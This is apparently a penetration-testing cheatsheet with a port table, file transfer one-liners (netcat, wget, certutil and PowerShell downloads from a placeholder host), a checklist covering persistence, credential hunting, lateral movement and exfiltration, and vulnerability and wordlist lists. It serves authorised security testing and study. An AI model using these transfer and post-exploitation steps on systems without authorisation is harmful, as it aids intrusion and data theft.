# Security Resources & References

Quick reference guides and cheatsheets for penetration testing.

## Port Reference

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | Check anonymous login |
| 22 | SSH | Version enumeration, key-based auth |
| 23 | Telnet | Plain text, usually vulnerable |
| 25 | SMTP | User enumeration possible |
| 53 | DNS | Zone transfers, subdomain enum |
| 80/443 | HTTP/HTTPS | Web application testing |
| 110/995 | POP3/POP3S | Email service |
| 139/445 | SMB | File shares, null sessions |
| 1433 | MSSQL | Default database port |
| 3306 | MySQL | Default database port |
| 3389 | RDP | Windows remote desktop |
| 5432 | PostgreSQL | Default database port |

## File Transfer Methods

### Linux to Linux
```bash
# Python HTTP server
python3 -m http.server 8000
wget http://[ip]:8000/file

# Netcat
nc -lvnp 4444 > file  # Receiver
nc [ip] 4444 < file   # Sender

# SCP
scp file user@[ip]:/path/
```

### Windows Transfer
```powershell
# PowerShell download
Invoke-WebRequest -Uri http://[ip]/file -OutFile file
iwr http://[ip]/file -o file

# Certutil
certutil -urlcache -f http://[ip]/file file

# SMB server (from Linux)
impacket-smbserver share . -smb2support
# From Windows: copy \\[ip]\share\file
```

## Methodology Checklist

### Initial Enumeration
- [ ] Full port scan
- [ ] Service version detection
- [ ] UDP scan (top 100)
- [ ] OS detection
- [ ] Script scanning on interesting ports

### Web Application
- [ ] Directory/file enumeration
- [ ] Technology stack identification
- [ ] Subdomain enumeration
- [ ] Parameter fuzzing
- [ ] Authentication testing
- [ ] Session management
- [ ] Input validation testing

### Post-Exploitation
- [ ] Establish persistence
- [ ] Enumerate local system
- [ ] Check for credentials
- [ ] Network mapping
- [ ] Lateral movement opportunities
- [ ] Data exfiltration paths

## Common Vulnerabilities

### Web
- SQL Injection
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- XML External Entity (XXE)
- Server-Side Request Forgery (SSRF)
- Insecure Deserialization
- File Upload vulnerabilities
- Directory Traversal
- Command Injection

### System
- Weak passwords
- Unpatched services
- Misconfigured services
- SUID/GUID binaries
- Kernel exploits
- Cron job abuse
- PATH hijacking
- Library hijacking

## Encoding/Decoding

```bash
# Base64
echo -n "text" | base64
echo -n "dGV4dA==" | base64 -d

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('text'))"

# Hex
echo -n "text" | xxd -p
echo "74657874" | xxd -r -p
```

## Useful Wordlists

- `/usr/share/wordlists/rockyou.txt` - Passwords
- `/usr/share/seclists/Discovery/Web-Content/` - Web content
- `/usr/share/seclists/Usernames/` - Username lists
- `/usr/share/wordlists/dirb/` - Directory brute-forcing
- `/usr/share/seclists/Fuzzing/` - Fuzzing payloads